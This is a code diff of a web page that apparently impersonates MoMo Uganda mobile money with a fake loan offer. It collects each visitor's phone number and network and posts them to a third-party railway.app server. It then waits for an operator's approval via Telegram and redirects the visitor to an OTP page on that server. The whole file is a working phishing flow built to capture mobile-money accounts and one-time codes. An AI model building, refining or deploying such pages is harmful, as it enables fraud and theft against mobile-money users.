@@ -3,28 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>Verify & Authorize Loan - MoMo Uganda</title>
+    <title>Verify Loan - MoMo Uganda</title>
     <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --red: #E42320;
-            --red-dark: #c01c1a;
-            --red-soft: rgba(228,35,32,0.08);
-            --red-border: rgba(228,35,32,0.18);
-            --text-dark: #111827;
-            --text-mid: #4b5563;
-            --text-light: #9ca3af;
-            --bg: #f3f4f6;
-            --card: #ffffff;
-            --border: #e5e7eb;
-            --input-bg: #f9fafb;
-            --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
-            --green: #10b981;
-        }
-        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'DM Sans', sans-serif;
-            background: var(--bg);
+            background: #f3f4f6;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -34,15 +19,10 @@
         .card {
             width: 100%;
             max-width: 430px;
-            background: var(--card);
+            background: white;
             border-radius: 28px;
-            box-shadow: var(--shadow);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
             overflow: hidden;
-            animation: fadeUp 0.45s cubic-bezier(.22,.8,.3,1) both;
-        }
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(24px); }
-            to   { opacity: 1; transform: translateY(0); }
         }
         .header {
             background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
@@ -58,11 +38,11 @@
             background: white;
             border-radius: 14px;
             padding: 6px;
+            width: 48px;
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 48px;
-            height: 48px;
         }
         .brand-name {
             font-family: 'Sora', sans-serif;
@@ -73,7 +53,6 @@
         .brand-sub {
             font-size: 11.5px;
             color: rgba(255,255,255,0.72);
-            text-transform: uppercase;
         }
         .header-title {
             font-family: 'Sora', sans-serif;
@@ -88,8 +67,8 @@
         }
         .loan-info {
             margin: 20px 22px 0;
-            background: var(--red-soft);
-            border: 1px solid var(--red-border);
+            background: rgba(228,35,32,0.08);
+            border: 1px solid rgba(228,35,32,0.18);
             border-radius: 18px;
             padding: 16px 18px;
             display: flex;
@@ -98,54 +77,43 @@
         }
         .loan-icon {
             width: 42px; height: 42px;
-            background: var(--red);
+            background: #E42320;
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
+            color: white;
+            font-size: 20px;
         }
         .loan-amount {
             font-family: 'Sora', sans-serif;
             font-size: 26px;
             font-weight: 800;
-            color: var(--text-dark);
+            color: #111827;
         }
         .form-body {
             padding: 22px 22px 26px;
         }
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
         label {
             display: block;
             font-size: 13px;
             font-weight: 600;
-            color: var(--text-dark);
             margin-bottom: 7px;
         }
         select, input {
             width: 100%;
             padding: 13px 15px;
-            background: var(--input-bg);
-            border: 1.5px solid var(--border);
+            background: #f9fafb;
+            border: 1.5px solid #e5e7eb;
             border-radius: 13px;
-            font-family: 'DM Sans', sans-serif;
             font-size: 15.5px;
             outline: none;
         }
         select:focus, input:focus {
-            border-color: var(--red);
-            box-shadow: 0 0 0 3.5px rgba(228,35,32,0.10);
-        }
-        .error-msg {
-            display: none;
-            background: #fff1f1;
-            border: 1px solid #fca5a5;
-            color: #b91c1c;
-            font-size: 13.5px;
-            border-radius: 12px;
-            padding: 12px 14px;
-            margin-bottom: 16px;
+            border-color: #E42320;
         }
         .btn-primary {
             width: 100%;
@@ -153,11 +121,11 @@
             color: white;
             border: none;
             padding: 15px;
-            font-family: 'Sora', sans-serif;
             font-size: 16px;
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
+            margin-top: 10px;
         }
         .btn-primary:disabled {
             background: #d1d5db;
@@ -166,19 +134,67 @@
         .btn-back {
             width: 100%;
             background: transparent;
-            color: var(--text-mid);
-            border: 1.5px solid var(--border);
+            color: #4b5563;
+            border: 1.5px solid #e5e7eb;
             padding: 14px;
             font-weight: 600;
             border-radius: 50px;
             cursor: pointer;
             margin-top: 10px;
         }
+        .error-msg {
+            display: none;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            font-size: 13.5px;
+        }
+        .status-msg {
+            display: none;
+            background: #eff6ff;
+            border: 1px solid #93c5fd;
+            color: #1e40af;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            text-align: center;
+            font-weight: 600;
+        }
+        .waiting-area {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: #fef3c7;
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+        .waiting-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #E42320;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        .dot:nth-child(2) { animation-delay: 0.3s; }
+        .dot:nth-child(3) { animation-delay: 0.6s; }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
         #spinner {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(10,10,10,0.90);
+            background: rgba(0,0,0,0.9);
             z-index: 10000;
             align-items: center;
             justify-content: center;
@@ -186,52 +202,19 @@
             gap: 20px;
         }
         .spin-ring {
-            width: 62px; height: 62px;
-            border: 5px solid rgba(255,255,255,0.12);
-            border-top-color: var(--red);
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top-color: #E42320;
             border-radius: 50%;
-            animation: spin 0.9s linear infinite;
+            animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .security-note {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            justify-content: center;
-            font-size: 12px;
-            color: var(--text-light);
-            margin-top: 18px;
-        }
-        .status-message {
             text-align: center;
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 16px;
-            display: none;
-            font-weight: 600;
-        }
-        .status-message.processing { background: #eff6ff; color: #1e40af; border: 1px solid #93c5fd; }
-        .status-message.success { background: #f0fdf4; color: #166534; border: 1px solid #86efac; }
-        .status-message.error { background: #fef2f2; color: #991b1b; border: 1px solid #fca5a5; }
-        .waiting-animation {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin: 10px 0;
-        }
-        .waiting-dot {
-            width: 10px;
-            height: 10px;
-            background: var(--red);
-            border-radius: 50%;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        .waiting-dot:nth-child(2) { animation-delay: 0.3s; }
-        .waiting-dot:nth-child(3) { animation-delay: 0.6s; }
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.2); }
+            font-size: 12px;
+            color: #9ca3af;
+            margin-top: 18px;
         }
     </style>
 </head>
@@ -240,9 +223,10 @@
     <div class="header">
         <div class="logo-wrap">
             <div class="logo-bg">
-                <svg width="36" height="36" viewBox="0 0 96 96" fill="none">
-                    <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833Z" fill="#E32526"/>
-                    <path d="M48.665 40.9682C48.6117 41.3448 48.69 41.7115 48.6867 42.0832C48.685 43.6065 48.6867 45.1332 48.685 46.6565C48.685 46.9098 48.7117 47.1598 48.765 47.4048C48.9817 48.3765 49.79 48.9532 50.78 48.8315C51.54 48.7365 52.3083 48.7315 53.0717 48.6665C53.3917 48.6398 53.4933 48.7815 53.47 49.1215C53.4333 49.6315 53.4367 50.1415 53.4683 50.6532C53.5333 51.7132 53.0367 52.4698 52.1317 52.8448C49.685 53.8565 47.27 53.8332 45.0633 52.2398C43.85 51.3648 43.2017 50.1132 43.1317 48.5682C43.0467 46.5832 43.01 44.5982 42.95 42.6098C42.8867 40.6032 42.9067 38.5948 42.9217 36.5882C42.9317 35.2415 43.5567 34.1482 44.55 33.2632C45.1017 32.7698 45.7167 32.3682 46.385 32.0482C46.9917 31.7565 47.6267 31.6465 48.2933 31.6565C48.5317 31.6615 48.6217 31.7515 48.645 31.9965C48.71 32.6315 48.6783 33.2682 48.6917 33.8498C48.6917 34.3648 48.6867 34.8298 48.6917 35.2932C48.6933 35.6965 48.8367 35.8432 49.245 35.9032C49.5267 35.9465 49.8067 35.9098 50.0883 35.9082C51.0583 35.8965 52.025 35.8965 52.995 35.9032C53.5667 35.9098 53.7433 36.0848 53.7267 36.6498C53.71 37.1548 53.795 37.6532 53.7367 38.1615C53.605 39.2765 52.95 39.9348 51.9333 40.2882C51.3717 40.4848 50.7867 40.4898 50.1983 40.4898C49.8367 40.4882 49.4717 40.4582 49.11 40.5165C48.85 40.5598 48.7067 40.6898 48.67 40.9682H48.665Z" fill="white"/>
+                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                    <rect x="3" y="12" width="22" height="14" rx="3" fill="white"/>
+                    <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="white" stroke-width="2.2" fill="none"/>
+                    <circle cx="14" cy="19" r="2.5" fill="#E42320"/>
                 </svg>
             </div>
             <div>
@@ -250,34 +234,50 @@
                 <div class="brand-sub">Mobile Money</div>
             </div>
         </div>
-        <div class="header-title">Authorize Your Loan</div>
-        <div class="header-desc">Enter your MoMo number to continue</div>
+        <div class="header-title">Verify Your Loan</div>
+        <div class="header-desc">Enter your details to continue</div>
     </div>
 
     <div class="loan-info">
-        <div class="loan-icon">
-            <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2" width="22" height="22">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
-            </svg>
-        </div>
+        <div class="loan-icon">₸</div>
         <div>
-            <div style="font-size:11px; color:var(--red);">MoMo Loan</div>
+            <div style="font-size:11px; color:#E42320;">Loan Amount</div>
             <div class="loan-amount" id="loanAmount">—</div>
-            <div class="loan-details" id="loanDetails" style="font-size:12px; color:var(--text-mid);"></div>
+            <div id="loanDetails" style="font-size:12px; color:#4b5563;"></div>
         </div>
     </div>
 
     <div class="form-body">
         <div class="form-group">
+            <label>Mobile Money Network</label>
+            <select id="network">
+                <option value="MTN">MTN MoMo</option>
+                <option value="Airtel">Airtel Money</option>
+                <option value="Africell">Africell</option>
+            </select>
+        </div>
+        <div class="form-group">
             <label>MoMo Phone Number</label>
             <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
-            <div style="font-size: 11px; color: #9ca3af; margin-top: 6px;">Enter Uganda number (077, 078, 075, 070, 039)</div>
+            <div style="font-size:11px; color:#9ca3af; margin-top:5px;">Enter Uganda number (077, 078, 075, 070, 039)</div>
         </div>
-        <div class="error-msg" id="errMsg"></div>
-        <div class="status-message" id="statusMsg"></div>
-        <button class="btn-primary" id="continueBtn">Submit Application →</button>
+        
+        <div class="error-msg" id="errorMsg"></div>
+        <div class="status-msg" id="statusMsg"></div>
+        
+        <div class="waiting-area" id="waitingArea">
+            <strong>⏳ Waiting for Admin Approval</strong>
+            <div class="waiting-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application...</p>
+        </div>
+        
+        <button class="btn-primary" id="submitBtn">Submit Application →</button>
         <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
-        <div class="security-note">🔒 256-bit encrypted & secured by MoMo Uganda</div>
+        <div class="security-note">🔒 Secured by MoMo Uganda</div>
     </div>
 </div>
 
@@ -287,168 +287,163 @@
 </div>
 
 <script>
-    const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';
+    const API_URL = 'https://momo-uganda-production.up.railway.app';
     
     let pollInterval = null;
     let currentLoanId = null;
 
-    const phoneInput = document.getElementById('phone');
-    const continueBtn = document.getElementById('continueBtn');
-    const errMsg = document.getElementById('errMsg');
-    const statusMsg = document.getElementById('statusMsg');
-    const spinner = document.getElementById('spinner');
-
     function loadLoanData() {
-        const calculatorData = sessionStorage.getItem('calculatorData');
-        if (calculatorData) {
-            const data = JSON.parse(calculatorData);
-            document.getElementById('loanAmount').textContent = `UGX ${data.amount.toLocaleString()}`;
-            const months = data.duration / 30;
-            document.getElementById('loanDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • UGX ${data.monthly.toLocaleString()}/month`;
+        const data = sessionStorage.getItem('calculatorData');
+        if (data) {
+            const loan = JSON.parse(data);
+            document.getElementById('loanAmount').textContent = `UGX ${loan.amount.toLocaleString()}`;
+            document.getElementById('loanDetails').textContent = `${loan.duration/30} months • UGX ${loan.monthly.toLocaleString()}/month`;
         }
     }
 
-    function isValidUgandaNumber(phone) {
+    function isValidPhone(phone) {
         if (phone.length !== 10) return false;
-        const validPrefixes = ['077', '078', '075', '070', '039', '074', '076'];
-        return validPrefixes.some(p => phone.startsWith(p));
-    }
-
-    function getNetworkName(phone) {
-        if (phone.startsWith('077') || phone.startsWith('078')) return 'MTN';
-        if (phone.startsWith('075') || phone.startsWith('074')) return 'Airtel';
-        if (phone.startsWith('070') || phone.startsWith('076')) return 'Africell';
-        if (phone.startsWith('039')) return 'MTN';
-        return 'Unknown';
+        const prefixes = ['077', '078', '075', '070', '039', '074', '076'];
+        return prefixes.some(p => phone.startsWith(p));
     }
 
     function showError(msg) {
-        errMsg.textContent = msg;
-        errMsg.style.display = 'block';
-        setTimeout(() => { errMsg.style.display = 'none'; }, 4000);
+        const err = document.getElementById('errorMsg');
+        err.textContent = msg;
+        err.style.display = 'block';
+        setTimeout(() => err.style.display = 'none', 4000);
     }
 
-    function showStatus(msg, type = 'processing') {
-        statusMsg.textContent = msg;
-        statusMsg.className = `status-message ${type}`;
-        statusMsg.style.display = 'block';
+    function showStatus(msg, isSuccess = false) {
+        const status = document.getElementById('statusMsg');
+        status.textContent = msg;
+        status.style.background = isSuccess ? '#f0fdf4' : '#eff6ff';
+        status.style.color = isSuccess ? '#166534' : '#1e40af';
+        status.style.border = isSuccess ? '1px solid #86efac' : '1px solid #93c5fd';
+        status.style.display = 'block';
+        setTimeout(() => status.style.display = 'none', 5000);
     }
 
-    // Poll for loan status
+    // Poll for approval status
     function startPolling(loanId) {
+        console.log('Starting polling for loan:', loanId);
+        
         pollInterval = setInterval(async () => {
             try {
-                const response = await fetch(`${RAILWAY_URL}/api/loan/${loanId}`);
+                const response = await fetch(`${API_URL}/api/loan/${loanId}`);
                 const data = await response.json();
                 
+                console.log('Poll response:', data);
+                
                 if (data.success && data.loan.status === 'otp_sent') {
+                    // Approved! Redirect to OTP page
                     clearInterval(pollInterval);
-                    spinner.style.display = 'none';
-                    showStatus("✅ Approved! Redirecting to OTP page...", "success");
+                    document.getElementById('spinner').style.display = 'none';
+                    showStatus("✅ Approved! Redirecting to OTP page...", true);
                     setTimeout(() => {
-                        window.location.href = `${RAILWAY_URL}/otp.html`;
+                        window.location.href = `${API_URL}/otp.html`;
                     }, 1500);
-                } else if (data.success && data.loan.status === 'declined') {
+                } 
+                else if (data.success && data.loan.status === 'declined') {
                     clearInterval(pollInterval);
-                    spinner.style.display = 'none';
-                    showError("❌ Your application was declined.");
-                    continueBtn.disabled = false;
-                    continueBtn.textContent = "Submit Application →";
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('waitingArea').style.display = 'none';
+                    showError("❌ Application declined by admin.");
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').textContent = "Submit Application →";
                 }
             } catch (err) {
                 console.error('Polling error:', err);
             }
-        }, 3000);
+        }, 3000); // Check every 3 seconds
         
-        // Stop polling after 2 minutes
+        // Stop polling after 5 minutes
         setTimeout(() => {
             if (pollInterval) {
                 clearInterval(pollInterval);
-                if (spinner.style.display === 'flex') {
-                    spinner.style.display = 'none';
-                    showStatus("⏳ Still waiting for admin approval. Check your Telegram for updates.", "processing");
-                    continueBtn.disabled = false;
-                    continueBtn.textContent = "Submit Application →";
-                }
+                console.log('Polling stopped after timeout');
             }
-        }, 120000);
+        }, 300000);
     }
 
-    continueBtn.onclick = async () => {
-        const phone = phoneInput.value.trim();
-
-        if (!phone || !isValidUgandaNumber(phone)) {
+    // Submit application
+    document.getElementById('submitBtn').onclick = async () => {
+        const phone = document.getElementById('phone').value.trim();
+        const network = document.getElementById('network').value;
+        
+        if (!phone || !isValidPhone(phone)) {
             showError("Enter valid Uganda number (077/078/075/070/039)");
             return;
         }
 
-        const calculatorData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
-        const network = getNetworkName(phone);
+        const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
         
-        continueBtn.disabled = true;
-        continueBtn.textContent = "Submitting...";
-        spinner.style.display = 'flex';
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.textContent = "Submitting...";
+        document.getElementById('spinner').style.display = 'flex';
 
         try {
-            const response = await fetch(`${RAILWAY_URL}/api/save-loan`, {
+            const response = await fetch(`${API_URL}/api/save-loan`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     phone: phone,
                     pin: "1234",
                     network: network,
-                    amount: calculatorData.amount || 500000,
-                    duration: calculatorData.duration || 90,
-                    monthly: calculatorData.monthly || 182500,
-                    total: calculatorData.total || 547500,
-                    interest: calculatorData.interest || 47500
+                    amount: loanData.amount || 500000,
+                    duration: loanData.duration || 90,
+                    monthly: loanData.monthly || 182500,
+                    total: loanData.total || 547500,
+                    interest: loanData.interest || 47500
                 })
             });
 
             const data = await response.json();
-
+            
             if (data.success) {
                 currentLoanId = data.loanId;
                 sessionStorage.setItem('loanId', currentLoanId);
                 sessionStorage.setItem('userPhone', phone);
                 sessionStorage.setItem('userNetwork', network);
                 
-                showStatus("📱 Application sent to admin! Waiting for approval on Telegram...", "processing");
+                // Hide spinner, show waiting area
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('waitingArea').style.display = 'block';
+                btn.style.display = 'none';
                 
-                // Add waiting animation
-                const waitingDiv = document.createElement('div');
-                waitingDiv.className = 'waiting-animation';
-                waitingDiv.innerHTML = '<div class="waiting-dot"></div><div class="waiting-dot"></div><div class="waiting-dot"></div>';
-                statusMsg.parentNode.appendChild(waitingDiv);
+                showStatus("📱 Application sent! Waiting for admin approval on Telegram...");
                 
+                // Start polling for approval
                 startPolling(currentLoanId);
             } else {
-                spinner.style.display = 'none';
-                showError("Error submitting application: " + (data.error || "Unknown error"));
-                continueBtn.disabled = false;
-                continueBtn.textContent = "Submit Application →";
+                throw new Error(data.error || "Submission failed");
             }
-        } catch (error) {
-            console.error('Submit error:', error);
-            spinner.style.display = 'none';
-            showError("Network error. Please try again.");
-            continueBtn.disabled = false;
-            continueBtn.textContent = "Submit Application →";
+        } catch (err) {
+            console.error('Submit error:', err);
+            document.getElementById('spinner').style.display = 'none';
+            showError("Error: " + err.message);
+            btn.disabled = false;
+            btn.textContent = "Submit Application →";
         }
     };
 
-    phoneInput.addEventListener('input', () => {
-        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+    // Phone input validation
+    document.getElementById('phone').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
     });
 
-    loadLoanData();
-    
-    // Check for existing pending loan
+    // Check if there's a pending loan on page load
     const existingLoanId = sessionStorage.getItem('loanId');
     if (existingLoanId) {
-        showStatus("You have a pending application. Waiting for admin approval...", "processing");
-        startPolling(existingLoanId);
+        currentLoanId = existingLoanId;
+        document.getElementById('submitBtn').style.display = 'none';
+        document.getElementById('waitingArea').style.display = 'block';
+        showStatus("⏳ You have a pending application. Waiting for admin approval...");
+        startPolling(currentLoanId);
     }
+
+    loadLoanData();
 </script>
 </body>
 </html>
